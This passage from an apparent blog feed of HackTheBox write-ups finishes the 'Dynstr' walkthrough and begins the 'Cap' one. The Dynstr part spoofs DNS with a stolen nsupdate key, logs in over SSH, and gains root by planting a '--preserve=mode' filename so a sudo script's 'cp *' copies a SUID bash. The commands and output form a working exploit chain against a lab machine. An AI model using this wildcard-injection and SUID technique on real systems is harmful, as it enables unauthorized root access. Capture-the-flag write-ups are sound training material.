</span></span><span class="line"><span class="cl"><span class="nv">from</span><span class="o">=</span><span class="s2">&#34;*.infra.dyna.htb&#34;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
</span></span></code></pre></div><h4 id="update-dns">Update DNS</h4>
<p>Looking at the DNS configuration under <code>/etc/bind</code> reveals that <code>dyna.htb</code> is not available for customers (via API) and it uses different key (<code>/etc/bind/infra.key</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind/$ cat named.conf.local
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">// Do any <span class="nb">local</span> configuration here
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Add infrastructure DNS updates.
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/infra.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dyna.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dyna.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;10.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;10.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;168.192.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;168.192.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">// Enable DynDNS updates to customer zones.
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/ddns.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dnsalias.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dnsalias.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dynamicdns.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dynamicdns.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;no-ip.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;no-ip.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// *** WORK IN PROGRESS, see bindmgr.sh ***
</span></span><span class="line"><span class="cl">// include <span class="s2">&#34;/etc/bind/named.conf.bindmgr&#34;</span><span class="p">;</span>
</span></span></code></pre></div><p>The idea here is to add a sub domain to <code>dyna.htb</code> zone, and it must be part of <code>infra.dyna.htb</code>, such as <code>iamf.infra.dyna.htb</code>. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind$ nsupdate -k ./infra.key
</span></span><span class="line"><span class="cl">&gt; update add iamf.infra.dyna.htb <span class="m">3600</span> A 10.10.14.53
</span></span><span class="line"><span class="cl">&gt; update add 53.14.10.10.in-addr.arpa. <span class="m">600</span> PTR iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">&gt; show
</span></span><span class="line"><span class="cl">Outgoing update query:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: UPDATE, status: NOERROR, id:      <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags:<span class="p">;</span> ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> UPDATE SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">0</span>       ANY     A
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">53.14.10.10.in-addr.arpa. <span class="m">600</span>   IN      PTR     iamf.infra.dyna.htb.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; send
</span></span></code></pre></div><p>I can confirm with dig that my domain has been added.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">56211</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.infra.dyna.htb.           IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">59</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Thu Jun <span class="m">17</span> 08:31:59 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">92</span>
</span></span></code></pre></div><h4 id="ssh-bindmgr">SSH bindmgr</h4>
<p>Now I can SSH login as bindmgr</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">Last login: Tue Jun  <span class="m">8</span> 19:19:17 <span class="m">2021</span> from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span>
</span></span></code></pre></div><p>The flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ cat user.txt
</span></span><span class="line"><span class="cl">6404e...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Checking for sudo permissions reveals that <code>bindmgr</code> is allowed to run a script called <code>bindmgr.sh</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> bindmgr on dynstr:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User bindmgr may run the following commands on dynstr:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
</span></span></code></pre></div><p>The author gives a well documented about what this script does.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># This script generates named.conf.bindmgr to workaround the problem</span>
</span></span><span class="line"><span class="cl"><span class="c1"># that bind/named can only include single files but no directories.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
</span></span><span class="line"><span class="cl"><span class="c1"># from named.conf.local (or others) and will include all files from the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># directory /etc/bin/named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># NOTE: The script is work in progress. For now bind is not including</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       named.conf.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Currently the script is only adding files to the directory but</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       not deleting them. As we generate the list of files to be included</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       from the source directory they won&#39;t be included anyway.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">indent<span class="o">()</span> <span class="o">{</span> sed <span class="s1">&#39;s/^/    /&#39;</span><span class="p">;</span> <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check versioning (.version)</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! -f .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">42</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span class="s2">&#34;`cat </span><span class="nv">$BINDMGR_DIR</span><span class="s2">/.version 2&gt;/dev/null`&#34;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">43</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create config file that includes all files from named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> file in * <span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="nb">printf</span> <span class="s1">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> &gt;&gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check generated configuration with named-checkconf.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Checking staged configuration.&#34;</span>
</span></span><span class="line"><span class="cl">named-checkconf <span class="nv">$BINDMGR_CONF</span> &gt;/dev/null
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
</span></span><span class="line"><span class="cl">    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> indent
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">44</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[+] Configuration successfully staged.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># *** TODO *** Uncomment restart once we are live.</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># systemctl restart bind9</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
</span></span><span class="line"><span class="cl">        systemctl status bind9
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span></code></pre></div><p>The first two <code>if</code> statement show that the script wants a file called <code>.version</code>, and since it looks from <code>$PWD</code>, I can create that file in anywhere.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</span></span></code></pre></div><p>Then when I run the script, it throws the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found
</span></span></code></pre></div><p>And this one is interesting</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</span></span></code></pre></div><p>If I trace it, the error come from these lines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>According to <a href="https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/">Hackingarticles</a>, using <code>cp</code> with <code>*</code> can lead to wildcard injection.</p>
<h4 id="exploitation">Exploitation</h4>
<p>To exploit <code>cp</code> with <code>*</code> (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename  <code>--preserve=mode</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ touch  <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ cp /bin/bash .
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ chmod u+s bash
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">1164</span>
</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">2</span> root    root        <span class="m">100</span> Jun <span class="m">17</span> 15:18  .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">17</span> root    root       <span class="m">3940</span> Jun <span class="m">17</span> 10:51  ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x  <span class="m">1</span> bindmgr bindmgr <span class="m">1183448</span> Jun <span class="m">17</span> 15:18  bash
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">1</span> Jun <span class="m">17</span> 15:12 <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">2</span> Jun <span class="m">17</span> 14:47  .version
</span></span></code></pre></div><p><code>cp</code> will see that <code>--preserve=mode</code> file as name as a flag/option/switch, so it becomes</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cp .version --preserve<span class="o">=</span>mode /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>When I run <code>bindmgr.sh</code> again, it throws another error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">&#39;ELF☻☺☺...&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">&#39;♥h□ȀE□♣&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">&#39;□YF&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">&#39;}&#39;</span>
</span></span></code></pre></div><p>But now under <code>/etc/bind/named.bindmgr</code>, I have a copy of bash with SUID permissions set to root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">total <span class="m">1168</span>
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">2</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 .
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">3</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root <span class="nb">bind</span> <span class="m">1183448</span> Jun <span class="m">17</span> 15:18 bash
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root <span class="nb">bind</span>       <span class="m">2</span> Jun <span class="m">17</span> 15:18 .version
</span></span></code></pre></div><p>Executing that bash with <code>-p</code> gives me a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
</span></span><span class="line"><span class="cl">bash-5.0# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span>,1001<span class="o">(</span>bindmgr<span class="o">)</span>
</span></span><span class="line"><span class="cl">bash-5.0# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-5.0# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">14</span> 14:18 cleanup
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun <span class="m">17</span> 10:51 root.txt
</span></span><span class="line"><span class="cl">bash-5.0# cat root.txt
</span></span><span class="line"><span class="cl">64348...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cap</title>
      <link>https://fahmifj.github.io/hackthebox/cap/</link>
      <pubDate>Thu, 14 Oct 2021 04:42:42 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/cap/</guid>
      <description>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a pcap file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the CAP_SETUID capability set, which can be exploited to gain root access.
Skills Learned Identifying/Exploiting IDOR Exploiting CAP_SETUID on Python Tools nmap wireshark Reconnaissance Nmap Running nmap scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</description>
      <content:encoded><![CDATA[<p>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a <code>pcap</code> file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the <code>CAP_SETUID</code> capability set, which can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Identifying/Exploiting IDOR</li>
<li>Exploiting CAP_SETUID on Python</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>nmap</li>
<li>wireshark</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Running <code>nmap</code> scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.245        
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:07 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.245
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.070s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">21/tcp open  ftp     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.33 seconds
</span></span><span class="line"><span class="cl">→ root@kali «cap» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p21,22,80 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.245
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:08 EDT
